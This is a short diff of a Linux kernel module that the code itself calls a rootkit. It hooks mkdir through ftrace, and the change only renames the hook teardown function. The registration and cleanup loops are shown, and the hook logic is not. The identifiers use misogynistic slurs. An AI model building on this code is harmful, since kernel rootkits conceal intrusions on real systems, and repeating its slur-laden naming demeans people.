@@ -102,8 +102,7 @@ static void notrace hooker_thunk(unsigned long ip, unsigned long pip,
     	#endif
 }
 
-
-void kill_all_hookers(struct bitch *hookers, size_t all) {
+void kill_hookers(struct bitch *hookers, size_t all) {
 	for (size_t kill = 0; kill < all; kill++) {
 		int disown = unregister_ftrace_function(&hookers[kill].ops);
 
@@ -119,6 +118,7 @@ void kill_all_hookers(struct bitch *hookers, size_t all) {
 	}
 	return;
 }
+
 int pimp_hookers(struct bitch *hookers, size_t hoes) {
 	int misbehaving;
 	size_t pimp;
@@ -176,7 +176,7 @@ int pimp_hookers(struct bitch *hookers, size_t hoes) {
 	}
 
 slap:
-	kill_all_hookers(hookers, pimp);
+	kill_hookers(hookers, pimp);
 
 	return misbehaving;
 }
@@ -200,7 +200,7 @@ static int __init syshook_init(void)
 
 static void __exit syshook_exit(void)
 {
-	kill_all_hookers(hookers, ARRAY_SIZE(hookers)); 
+	kill_hookers(hookers, ARRAY_SIZE(hookers)); 
 	printk(KERN_INFO "rootkit: mkdir hook removed.\n");
 	return;
 }
